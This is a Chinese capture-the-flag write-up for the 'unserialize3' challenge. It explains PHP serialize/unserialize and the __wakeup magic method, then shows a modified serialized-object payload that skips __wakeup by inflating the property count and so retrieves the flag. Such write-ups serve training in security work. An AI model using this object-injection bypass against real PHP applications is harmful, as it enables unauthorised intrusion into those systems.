知识点：

1、serialize()函数：用于序列化对象或数组，并返回一个字符串。序列化对象后，可以很方便的将它传递给其他需要它的地方，且其类型和结构不会改变。

2、unserialize()函数：用于将通过serialize()函数序列化后的对象或数组进行反序列化，并返回原始的对象结构。

3、魔术方法：PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以 __ 为前缀。

4、serialize()和unserialize()函数对魔术方法的处理：serialize()函数会检查类中是否存在一个魔术方法__sleep()。如果存在，该方法会先被调用，然后才执行序列化操作，此功能可以用于清理对象。
unserialize()函数会检查类中是否存在一个魔术方法\_\_wakeup()，如果存在，则会先调用 \_\_wakeup 方法，预先准备对象需要的资源。

5、\_\_wakeup()执行漏洞：一个字符串或对象被序列化后，如果其属性被修改，则不会执行 \_\_wakeup()函数，这也是一个绕过点。

对于unserialize3这个题，里面有__wakeup()函数：


 结合题目和题中代码，就是让我们运用，__wakeup()函数的漏洞拿flag的。

创建一个xctf类并对其进行序列化：

```php
<?php
class xctf{
public $flag = '111';
public function __wakeup(){
exit('bad requests');
}
}
$c = new xctf();
print(serialize($c));
?>
```

得到结果：O:4:"xctf":1:{s:4:"flag";s:3:"111";}

大括号前面的1便是属性变量的个数，只需对其进行更改便可以绕过__wakeup()，使exit函数不被执行。

传参?code=O:4:"xctf":2:{s:4:"flag";s:3:"111";}，拿到flag：xctf{63a8055fd385db30f57d32b44225c42b}